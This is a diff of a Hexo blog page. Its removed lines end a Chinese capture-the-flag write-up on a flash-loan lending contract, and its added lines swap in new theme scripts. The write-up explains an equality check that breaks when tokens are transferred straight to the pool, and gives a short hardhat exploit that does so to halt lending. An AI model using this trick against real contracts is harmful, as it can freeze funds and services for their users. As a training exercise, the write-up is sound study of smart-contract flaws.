class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>合约的结构很简单，只有两个函数，一个是 depositTokens 函数，一个是 flashLoan 函数，depositTokens 函数的功能是用户存钱到借贷合约，flashLoan 函数的功能是给用户借钱，我们主要看 flashLoan 函数。</p>
-<p>flashLoan 函数中有一行特别的判断：<br><code>assert(poolBalance == balanceBefore);</code><br>要求 poolBalance 变量等于 balanceBerfore 变量，poolBalance 变量只有在调用 depositTokens 函数的时候才会增加，而 balanceBefore 是用户借钱时借贷池子的金额，所以我们可以直接向合约转账，这样 poolBalance 的值不变，balanceBefore 的值会增加，这个判断就通过不了，我们就可以阻止这个池子继续提供贷款。</p>
-<h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h3><p>我们直接向 UnstoppableLender 合约转任意金额，然后用 hardhat 测试就可以了，攻击代码如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">transfer</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>,<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/11/28/Lotteries/" rel="next" title="Lotteries">
-                  Lotteries <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
+  </div>
 </div>
 
+    
 
-
-
-
-
-</div>
+    
   </main>
 
-  <footer class="footer">
+  <footer>
     <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Yuki</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
+  
+  
+  
+  
+</div>
+
   </footer>
 
+  <!-- Scripts -->
   
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
 
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
 
 
   
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
 
 
   
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
